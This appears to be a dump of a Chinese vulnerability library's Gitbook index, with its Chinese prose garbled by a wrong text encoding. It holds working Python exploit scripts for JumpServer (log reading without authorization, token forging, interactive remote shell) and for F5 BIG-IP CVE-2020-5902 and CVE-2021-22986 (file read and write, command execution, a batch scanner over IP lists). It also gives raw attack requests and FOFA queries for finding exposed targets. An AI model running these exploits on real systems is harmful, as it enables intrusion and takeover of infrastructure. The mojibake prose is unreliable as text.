ÂÆâË£ÖÊ≥®ÊÑè ÈÖçÁΩÆÁΩëÁªúÔºåÈÖçÁΩÆMysqlÔºåÈÖçÁΩÆRedis ÈÄâÊã© n Á≠âÂæÖÂÆåÊàêÂÆâË£ÖÊâßË°å‰ª•‰∏ãÂëΩ‰ª§ cd /opt/jumpserver-installer-v2.6.1 ./jmsctl.sh start Á≠âÂæÖÂÆâË£ÖÂÆåÊØïËÆøÈóÆ http://xxx.xxx.xxx.xxxx:8080 ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å amdin:admin ÊºèÊ¥ûÂ§çÁé∞ ËøõÂÖ•ÂêéÂè∞Ê∑ªÂä†ÈÖçÁΩÆ ËµÑ‰∫ßÁÆ°ÁêÜ --> Á≥ªÁªüÁî®Êà∑ ËµÑ‰∫ßÁÆ°ÁêÜ --> ÁÆ°ÁêÜÁî®Êà∑ Áî®Êà∑ÁÆ°ÁêÜ --> Áî®Êà∑ÂàóË°® ËµÑ‰∫ßÁÆ°ÁêÜ --> ËµÑ‰∫ßÂàóË°® Êü•Áúã‰∏Ä‰∏ãÈ°πÁõÆ‰ª£Á†ÅÊèê‰∫§ÂèòÂä® import time import os import threading import json from common.utils import get_logger from .celery.utils import get_celery_task_log_path from channels.generic.websocket import JsonWebsocketConsumer logger = get_logger(__name__) class CeleryLogWebsocket(JsonWebsocketConsumer): disconnected = False def connect(self): user = self.scope[\"user\"] if user.is_authenticated and user.is_org_admin: self.accept() else: self.close() def receive(self, text_data=None, bytes_data=None, **kwargs): data = json.loads(text_data) task_id = data.get(\"task\") if task_id: self.handle_task(task_id) def wait_util_log_path_exist(self, task_id): log_path = get_celery_task_log_path(task_id) while not self.disconnected: if not os.path.exists(log_path): self.send_json({'message': '.', 'task': task_id}) time.sleep(0.5) continue self.send_json({'message': '\\r\\n'}) try: logger.debug('Task log path: {}'.format(log_path)) task_log_f = open(log_path, 'rb') return task_log_f except OSError: return None def read_log_file(self, task_id): task_log_f = self.wait_util_log_path_exist(task_id) if not task_log_f: logger.debug('Task log file is None: {}'.format(task_id)) return task_end_mark = [] while not self.disconnected: data = task_log_f.read(4096) if data: data = data.replace(b'\\n', b'\\r\\n') self.send_json( {'message': data.decode(errors='ignore'), 'task': task_id} ) if data.find(b'succeeded in') != -1: task_end_mark.append(1) if data.find(bytes(task_id, 'utf8')) != -1: task_end_mark.append(1) elif len(task_end_mark) == 2: logger.debug('Task log end: {}'.format(task_id)) break time.sleep(0.2) task_log_f.close() def handle_task(self, task_id): logger.info(\"Task id: {}\".format(task_id)) thread = threading.Thread(target=self.read_log_file, args=(task_id,)) thread.start() def disconnect(self, close_code): self.disconnected = True self.close() Êñ∞ÁâàÂØπÁî®Êà∑ËøõË°å‰∫Ü‰∏Ä‰∏™Âà§Êñ≠ÔºåÂèØ‰ª•‰ΩøÁî® Ë∞∑Ê≠åÊèí‰ª∂ WebSocket King ËøûÊé•‰∏äËøô‰∏™websocket ËøõË°åÊó•ÂøóËØªÂèñ ÊØîÂ¶ÇsendËøôÈáåËé∑ÂèñÁöÑ Task id ,ËøôÈáåÊòØÂèØ‰ª•Ëé∑Âæó‰∏Ä‰∫õÊïèÊÑüÁöÑ‰ø°ÊÅØÁöÑ Êü•Áúã‰∏Ä‰∏ãËøûÊé•WebÁªàÁ´ØÁöÑÂêéÁ´Øapi‰ª£Á†Å ÂèØ‰ª•ÁúãÂà∞ËøôÈáåË∞ÉÁî®Êó∂ÂøÖÈ°ªÈúÄË¶Å user asset system_user Ëøô‰∏â‰∏™ÂÄºÔºåÂÜçËé∑Âèñ‰∏Ä‰∏™20ÁßíÁöÑ token ËÆøÈóÆwebÁªàÁ´ØÂêéÊü•ÁúãÊó•ÂøóÁöÑË∞ÉÁî® docker exec -it (jumpserve/coreÁöÑdocker) /bin/bash cat gunicorn.log | grep /api/v1/perms/asset-permissions/user/validate/? assset_id=ee7e7446-6df7-4f60-b551-40a241958451 system_user_id=d89bd097-b7e7-4616-9422-766c6e4fcdb8 user_id=efede3f4-8659-4daa-8e95-9a841dbe82a8 ÂèØ‰ª•ÁúãÂà∞Âú®‰∏çÂêåÁöÑÊó∂Èó¥ËÆøÈóÆËøô‰∏™Êé•Âè£ÁöÑasset_idÁ≠âÈÉΩÊòØ‰∏ÄÊ†∑ÁöÑÔºåÊâÄ‰ª•Âè™Áî®Âú® ÂàöÂàöÁöÑÊú™ÊéàÊùÉÊó•ÂøóËØªÂèñÈáåÊâæÂà∞ÊÉ≥Ë¶ÅÁöÑËøôÂá†‰∏™ÂÄºÂ∞±ÂèØ‰ª•Ëé∑Âæó token ÂèëÈÄÅËØ∑Ê±ÇËé∑Âèñ20sÁöÑtoken Áúã‰∏Ä‰∏ã koko.js Ëøô‰∏™ÂâçÁ´ØÊñá‰ª∂ ÂêéÁ´Ø‰ª£Á†Å https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go ËøôÈáåÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøá Ëé∑ÂæóÁöÑtokenÊù•Ê®°ÊãüËØ∑Ê±Ç ÊàêÂäüËøûÊé•Ê®°Êãü‰∫ÜËøô‰∏™ token ÁöÑËØ∑Ê±Ç,ÂèØ‰ª•Âú®NetworkÁúã‰∏Ä‰∏ãÊµÅÈáèÊòØÊÄé‰πàÂèëÈÄÅÁöÑ Ê®°ÊãüËøûÊé•ÂèëÈÄÅÂíåÊé•ÂèëÊï∞ÊçÆ ËøôÈáåÂèØ‰ª•ÁúãÂà∞Êàë‰ª¨Âè™Ë¶ÅÊ®°Êãü‰∫ÜËøô‰∏™ÂèëÈÄÅÔºåËøîÂõûÁöÑÊï∞ÊçÆÂíåwebÁªàÁ´ØÊòØ‰∏ÄÊ†∑ÁöÑÔºåÈÇ£Êàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáËøôÊ†∑ÁöÑÊñπÊ≥ïÊù•ËøõË°åÂëΩ‰ª§ÊâßË°å‰∫Ü ÊºèÊ¥ûÂà©Áî®POC [!NOTE] POC ÈáåÂåÖÂê´‰∏§‰∏™ÊñπÊ≥ïÔºå‰∏Ä‰∏™ÊòØËé∑ÂèñÊó•ÂøóÊñá‰ª∂ÔºåÂè¶‰∏Ä‰∏™ÊòØÂëΩ‰ª§ÊâßË°å Êó•ÂøóÊèêÂèñÂ∑≤ÁªèËøáÊª§‰∫ÜÈÉ®ÂàÜAPIË∞ÉÁî®ÁöÑÊï∞ÊçÆÔºåÂè™ÈúÄË¶ÅÊâæÂà∞ÈÇ£Âá†‰∏™ÂÄºÂ∞±Â•Ω‰∫Ü ÂëΩ‰ª§ÊâßË°åÈúÄË¶Å‰ªéÊó•Âøó‰∏≠Ëé∑ÂèñÊïèÊÑüÊï∞ÊçÆÂπ∂ÂÜôÂÖ•ËÑöÊú¨ÂØπÂ∫îÁöÑÂèòÈáè‰∏≠ Êé•Êî∂Êï∞ÊçÆÂ¶ÇÊûúÂç°‰ΩèËØ∑Ë∞ÉÊï¥ for i in range(7) Ëøô‰∏™‰ΩçÁΩÆÁöÑ 7 import requests import json import sys import time import asyncio import websockets import re from ws4py.client.threadedclient import WebSocketClient def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mPOC_Des: https://www.o2oxy.cn/ \\033[0m') print('+ \\033[34mVersion: JumpServer >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') class ws_long(WebSocketClient): def opened(self): req = '{\"task\":\"peiqi/../../../../../logs/gunicorn\"}' self.send(req) def closed(self, code, reason=None): print(\"Closed down:\", code, reason) def received_message(self, resp): resp = json.loads(str(resp)) # print(resp) data = resp['message'] print(data) if \"/api/v1/perms/asset-permissions/user/validate/?\" in data: print(data) async def send_msg(websocket, _text): if _text == \"exit\": print(f'you have enter \"exit\", goodbye') await websocket.close(reason=\"user exit\") return False await websocket.send(_text) recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) async def main_logic(target_url): print(\"\\033[32m[o] Ê≠£Âú®ËøûÊé•ÁõÆÊ†á: {}\\033[0m\".format(target_url)) async with websockets.connect(target_url) as websocket: recv_text = await websocket.recv() resws = json.loads(recv_text) id = resws['id'] print(\"\\033[36m[o] ÊàêÂäüËé∑Âèñ ID: {}\\033[0m\".format(id)) inittext = json.dumps({\"id\": id, \"type\": \"TERMINAL_INIT\", \"data\": \"{\\\"cols\\\":164,\\\"rows\\\":17}\"}) await send_msg(websocket, inittext) for i in range(7): recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) while True: cmd = str(input(\"\\033[35mcmd >>> \\033[0m\")) cmdtext = json.dumps({\"id\": id, \"type\": \"TERMINAL_DATA\", \"data\": cmd + \"\\r\\n\"}) await send_msg(websocket, cmdtext) for i in range(1): recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) def POC_1(target_url): vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" response = requests.get(url=vuln_url, timeout=5) print(response.status_code) ws_open = str(input(\"\\033[32m[o] ÊòØÂê¶ÊÉ≥Ë¶ÅÊèêÂèñÊó•ÂøóÔºàY/NÔºâ >>> \\033[0m\")) try: if ws_open == \"Y\" or ws_open == \"y\": ws = target_url.strip(\"http://\") try: ws = ws_long('ws://{}/ws/ops/tasks/log/'.format(ws)) ws.connect() ws.run_forever() ws.close() except KeyboardInterrupt: ws.close() else: print(\"\\033[31m[x] ÁõÆÊ†áÊºèÊ¥ûÂ∑≤‰øÆÂ§çÔºåÊó†Ê≥ïËé∑ÂèñÊïèÊÑüÊó•Âøó‰ø°ÊÅØ\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†áÊºèÊ¥ûÂ∑≤‰øÆÂ§çÔºåÊó†Ê≥ïËé∑ÂèñÊïèÊÑüÊó•Âøó‰ø°ÊÅØ,{}\\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, user, asset, system_user): if target_url == \"\" or asset == \"\" or system_user == \"\": print(\"\\033[31m[x] ËØ∑Ëé∑Âèñ assset Á≠âÂèÇÊï∞ÈÖçÁΩÆ\\033[0m\") sys.exit(0) data = {\"user\": user, \"asset\": asset, \"system_user\": system_user} vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" # vuln_url = target_url + \"/api/v1/authentication/connection-token/?user-only=1\" try: response = requests.post(vuln_url, json=data, timeout=5).json() print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±ÇÔºö{}\\033[0m\".format(vuln_url)) token = response['token'] print(\"\\033[36m[o] ÊàêÂäüËé∑ÂèñTokenÔºö{}\\033[0m\".format(token)) ws_url = target_url.strip(\"http://\") ws_url = \"ws://\" + ws_url + \"/koko/ws/token/?target_id={}\".format(token) asyncio.get_event_loop().run_until_complete(main_logic(ws_url)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê£ÄÊü• assset Á≠âÂèÇÊï∞ÈÖçÁΩÆ,{}\\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) user = \"ed3460eb-3c70-4beb-b631-f8f91c39bdd1\" asset = \"37fce0b0-cc4f-4822-8c33-afdebc888fa7\" system_user = \"da09ddd7-fd3f-46c3-914d-752883a4d950\" POC_1(target_url) POC_2(target_url, user, asset, system_user) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/F5 BIG-IP/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/F5 BIG-IP/","title":"F5 BIG-IP","keywords":"","body":"F5 BIG-IP F5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2020-5902 F5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-22986 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/F5 BIG-IP/F5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2020-5902.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/F5 BIG-IP/F5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2020-5902.html","title":"F5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2020-5902","keywords":"","body":"F5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2020-5902 ÊºèÊ¥ûÊèèËø∞ 2020Âπ¥07Êúà03Êó•Ôºå 360CERTÁõëÊµãÂèëÁé∞ F5 ÂèëÂ∏É‰∫Ü F5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°å ÁöÑÈ£éÈô©ÈÄöÂëäÔºåËØ•ÊºèÊ¥ûÁºñÂè∑‰∏∫ CVE-2020-5902ÔºåÊºèÊ¥ûÁ≠âÁ∫ßÔºö‰∏•Èáç„ÄÇ Êú™ÊéàÊùÉÁöÑËøúÁ®ãÊîªÂáªËÄÖÈÄöËøáÂêëÊºèÊ¥ûÈ°µÈù¢ÂèëÈÄÅÁâπÂà∂ÁöÑËØ∑Ê±ÇÂåÖÔºåÂèØ‰ª•ÈÄ†Êàê‰ªªÊÑè Java ‰ª£Á†ÅÊâßË°å„ÄÇËøõËÄåÊéßÂà∂ F5 BIG-IP ÁöÑÂÖ®ÈÉ®ÂäüËÉΩÔºåÂåÖÊã¨‰ΩÜ‰∏çÈôê‰∫é: ÊâßË°å‰ªªÊÑèÁ≥ªÁªüÂëΩ‰ª§„ÄÅÂºÄÂêØ/Á¶ÅÁî®ÊúçÂä°„ÄÅÂàõÂª∫/Âà†Èô§ÊúçÂä°Âô®Á´ØÊñá‰ª∂Á≠â„ÄÇËØ•ÊºèÊ¥ûÂΩ±ÂìçÊéßÂà∂Èù¢ÊùøÂèóÂΩ±ÂìçÔºå‰∏çÂΩ±ÂìçÊï∞ÊçÆÈù¢Êùø„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 FOFA [!NOTE] title=\"BIG-IP&reg ;- Redirect\" ÊºèÊ¥ûÂ§çÁé∞ Âú® tmshCmd ÁöÑ serviceÊñπÊ≥ïÂ§ÑÁêÜËØ∑Ê±ÇÁöÑÊó∂ÂÄôÔºåÊú™ÂØπcommand ÂèÇÊï∞ËøõË°åÂ§ÑÁêÜÔºåÁõ¥Êé•Ë∞ÉÁî® WorkspaceUtils.runTmshCommand(cmd, request); ÊñπÊ≥ïÊâßË°åÂëΩ‰ª§ÔºåÈôêÂà∂‰∫ÜÊâßË°ådelete,create,list,modify„ÄÇ if (\"POST\".equalsIgnoreCase(request.getMethod())) { String[] cmdArray = command.split(\" \"); String operation = cmdArray[0]; String module = cmdArray[2]; if (!ShellCommandValidator.checkForBadShellCharacters(command) && (operation.equals(\"create\") || operation.equals(\"delete\") || operation.equals(\"list\") || operation.equals(\"modify\")) && WHITELISTED_TMSH_MODULES.contains(module)) { try { String[] args = new String[]{command}; Result result = Syscall.callElevated(Syscall.TMSH, args); output = result.getOutput(); error = result.getError(); } catch (CallException var11) { logger.error(NLSEngine.getString(\"ilx.workspace.error.TmshCommandFailed\") + \": \" + var11.getMessage()); error = var11.getMessage(); } } else { error = NLSEngine.getString(\"ilx.workspace.error.RejectedTmshCommand\"); } Âú® fileRead ÁöÑ serviceÊñπÊ≥ïÂ§ÑÁêÜËØ∑Ê±ÇÁöÑÊó∂ÂÄôÔºåÊú™ÂØπ fileName ÂèÇÊï∞ËøõË°åÂ§ÑÁêÜÔºåÁõ¥Êé•Ë∞ÉÁî® WorkspaceUtils.readFile(fileName); ÊñπÊ≥ïÔºåËøõË°åÊñá‰ª∂ËØªÂèñ„ÄÇ Âú® fileSave ÁöÑ serviceÊñπÊ≥ïÂ§ÑÁêÜËØ∑Ê±ÇÁöÑÊó∂ÂÄôÔºåÊú™ÂØπ fileNameÔºåcontent ÂèÇÊï∞ËøõË°åÂ§ÑÁêÜÔºåÁõ¥Êé•Ë∞ÉÁî® WorkspaceUtils.saveFile(request); ÊñπÊ≥ïÔºåËøõË°åÊñá‰ª∂‰∏ä‰º†„ÄÇ ËØ¶ÊÉÖÂà©Áî®ÊñπÂºè https://github.com/jas502n/CVE-2020-5902 ËØ¶ÊÉÖÂà©Áî®ÊñπÂºè https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md ËØªÂèñÊñá‰ª∂ http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd ÂÜôÂÖ•Êñá‰ª∂ http://xxx.xxx.xxx.xxx/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp POST: fileName=/tmp/test.txt&content=test ËØªÂèñÊñá‰ª∂ /tmp/test ÊàêÂäüÂÜôÂÖ•Êñá‰ª∂ ÊºèÊ¥ûÂà©Áî®POC import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 CVE-2020-5902.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Language\":\"zh-CN,zh;q=0.9\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=version_url, timeout=10, verify=False, headers=headers) if \"output\" in response.text: print(\"\\033[32m[o] ÁõÆÊ†á {} Â≠òÂú®ÊºèÊ¥ûÔºåÂìçÂ∫î‰∏∫:\\n{}\\033[0m\".format(target_url, json.loads(response.text)[\"output\"])) else: print(\"\\033[31m[x] ÁõÆÊ†áÊºèÊ¥ûÊó†Ê≥ïÂà©Áî® \\033[0m\") except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†áÊºèÊ¥ûÊó†Ê≥ïÂà©Áî® ,{}\\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) ÂèÇËÄÉÊñáÁ´† https://mochazz.github.io/2020/07/11/F5-BIG-IP%E6%9C%AA%E6%8E%88%E6%9D%83RCE(CVE-2020-5902)/#%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/F5 BIG-IP/F5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-22986.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/F5 BIG-IP/F5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-22986.html","title":"F5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-22986","keywords":"","body":"F5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2021-22986 ÊºèÊ¥ûÊèèËø∞ F5 BIG-IP ÊòØÁæéÂõΩ F5 ÂÖ¨Âè∏ÁöÑ‰∏ÄÊ¨æÈõÜÊàê‰∫ÜÁΩëÁªúÊµÅÈáèÁÆ°ÁêÜ„ÄÅÂ∫îÁî®Á®ãÂ∫èÂÆâÂÖ®ÁÆ°ÁêÜ„ÄÅË¥üËΩΩÂùáË°°Á≠âÂäüËÉΩÁöÑÂ∫îÁî®‰∫§‰ªòÂπ≥Âè∞„ÄÇ ËøëÊó•ÔºåF5ÂèëÂ∏É‰∫ÜF5 BIG-IQ/F5 BIG-IP ‰ª£Á†ÅÊâßË°åÔºå‰ª£Á†ÅÊâßË°åÁöÑÈ£éÈô©Â£∞ÊòéÔºåF5ÂÆâÂÖ®ÂÖ¨ÂëäÊõ¥Êñ∞‰∫ÜBIG-IPÔºåBIG-IQ‰∏≠ÁöÑÂ§ö‰∏™‰∏•ÈáçÊºèÊ¥û„ÄÇÂª∫ËÆÆÂπøÂ§ßÁî®Êà∑ÂèäÊó∂Â∞Üf5 big-iq,f5 big-ipÂçáÁ∫ßÂà∞ÊúÄÊñ∞ÁâàÊú¨ÔºåÈÅøÂÖçÈÅ≠Âà∞ÊîªÂáª„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] F5 BIG-IP 16.x: 16.1.0.3 F5 BIG-IP 15.x: 15.1.0.4 F5 BIG-IP 14.x: 14.1.2.6 F5 BIG-IP 13.x: 13.1.3.4 F5 BIG-IP 12.x: 12.1.5.2 F5 BIG-IP 11.x: 11.6.5.2 FOFA [!NOTE] icon_hash=\"-335242539\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂèëÈÄÅËØ∑Ê±ÇÂåÖ POST /mgmt/tm/util/bash HTTP/1.1 Host: xxx.xxx.xxx.xxx:8443 Connection: close Content-Length: 41 Cache-Control: max-age=0 Authorization: Basic YWRtaW46QVNhc1M= X-F5-Auth-Token: Upgrade-Insecure-Requests: 1 Content-Type: application/json {\"command\":\"run\",\"utilCmdArgs\":\"-c id\"} ÊàêÂäüÊâßË°åÂëΩ‰ª§ id ÊºèÊ¥ûÂà©Áî®POC ÊâπÈáèÊµãËØï import requests import sys import random import re import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=2) if \"commandResult\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û,ÂìçÂ∫î‰∏∫:{} \\033[0m\".format(target_url, json.loads(response.text)[\"commandResult\"])) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"https://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÊä•Èîô \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) ÂëΩ‰ª§ÊâßË°å import requests import sys import random import re import base64 import time import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: F5 BIG-IP \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } data = '''{\"command\":\"run\",\"utilCmdArgs\":\"-c 'cat /etc/passwd'\"}''' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if 'root' in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û,ÂìçÂ∫î‰∏∫:{} \\033[0m\".format(target_url, json.loads(response.text)[\"commandResult\"])) while True: Cmd = str(input(\"\\033[35mCmd >>> \\033[0m\")) POC_2(target_url, Cmd) else: print(\"\\033[31m[x] ÁõÆÊ†á {}‰∏çÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ÁõÆÊ†á {} ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\".format(target_url), e) def POC_2(target_url, Cmd): vuln_url = target_url + \"/mgmt/tm/util/bash\" headers = { \"Authorization\": \"Basic YWRtaW46QVNhc1M=\", \"X-F5-Auth-Token\": \"\", \"Content-Type\": \"application/json\" } Cmd = \"'\" + Cmd + \"'\" data = '{\"command\":\"run\",\"utilCmdArgs\":\"-c %s\"}' % Cmd try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[32m{} \\033[0m\".format(json.loads(response.text)[\"commandResult\"])) except Exception as e: print(\"\\033[31m[x] ÂëΩ‰ª§ÊâßË°åÂ§±Ë¥• \\033[0m\".format(target_url), e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/OneBlog/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/OneBlog/","title":"OneBlog","keywords":"","body":"OneBlog Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/OneBlog/OneBlog Â∞è‰∫év2.2.1 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/OneBlog/OneBlog Â∞è‰∫év2.2.1 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"OneBlog Â∞è‰∫év2.2.1 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"OneBlog Â∞è‰∫év2.2.1 ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ OneBlog Â∞è‰∫év2.2.1 Áî±‰∫é‰ΩøÁî®Âê´ÊúâÊºèÊ¥ûÁâàÊú¨ÁöÑApache ShiroÂíåÈªòËÆ§ÁöÑÂØÜÈí•ÂØºËá¥Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÂΩ±Âìç [!NOTE] OneBlog FOFA [!NOTE] app=\"OneBlogÂºÄÊ∫êÂçöÂÆ¢ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÈôÜÈ°µÈù¢Â¶Ç‰∏ã ‰ΩøÁî®Â∑•ÂÖ∑Áõ¥Êé•Âà©Áî®Apache ShiroÊºèÊ¥ûÂç≥ÂèØ 